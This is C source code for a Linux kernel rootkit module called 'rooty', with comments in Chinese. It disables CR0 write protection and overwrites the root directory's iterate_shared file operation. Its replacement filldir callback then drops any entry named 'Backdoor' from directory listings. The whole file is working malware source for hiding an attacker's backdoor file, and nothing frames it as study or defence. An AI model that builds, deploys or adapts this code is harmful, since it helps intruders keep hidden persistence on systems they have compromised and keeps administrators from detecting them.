#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
# include <linux/fs.h> 

#define ROOT_PATH "/"
#define SECRET_FILE "Backdoor"

#define set_f_op(op, path, new, old)                        \
    do {                                                    \
        struct file *filp;                                  \
        struct file_operations *f_op;                       \
        printk("[+] open the path\n");                      \
        filp = filp_open(path, O_RDONLY, 0);                \
        if (IS_ERR(filp)) {                                 \
            printk("[x] filed to open \n");                 \
            old = NULL;                                     \
        } else {                                            \
            printk("[+] succeed open \n");                  \
            f_op = (struct file_operations *)filp->f_op;    \
            old = f_op->op;                                 \
            disable_write_protection();                     \
            f_op->op = new;                                 \
            printk("[+] Changing iterate from %p to %p.\n",old,new);                  \
            enable_write_protection();                      \
        }                                                   \
    } while(0)
    
int
(*real_iterate)(struct file *filp, struct dir_context *ctx);
int
(*real_filldir)(struct dir_context *ctx,
                const char *name, int namlen,
                loff_t offset, u64 ino, unsigned d_type);

int
fake_iterate(struct file *filp, struct dir_context *ctx);
int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);
             


inline void mywrite_cr0(unsigned long cr0) {
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

// 关闭写保护
void disable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    mywrite_cr0(cr0);
}

// 打开写保护
void enable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    mywrite_cr0(cr0);
}


static int rooty_init(void)
{   
    printk("[+] Start!\n");
    set_f_op(iterate_shared, ROOT_PATH, fake_iterate, real_iterate);

    if (!real_iterate) {
        return -ENOENT;
    }
	return 0;
}


static void rooty_exit(void)
{
    if (real_iterate) {
        void *dummy;
        set_f_op(iterate_shared, ROOT_PATH, real_iterate, dummy);
    }
    printk("[+] Exit\n");
    return;
}

int
fake_iterate(struct file *filp, struct dir_context *ctx)
{
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}

int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type) {
    if (strcmp(name, SECRET_FILE) == 0) {
        printk("[+] hide it!\n");
        return 0;
    }
    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}
MODULE_LICENSE("GPL");
module_init(rooty_init);
module_exit(rooty_exit);
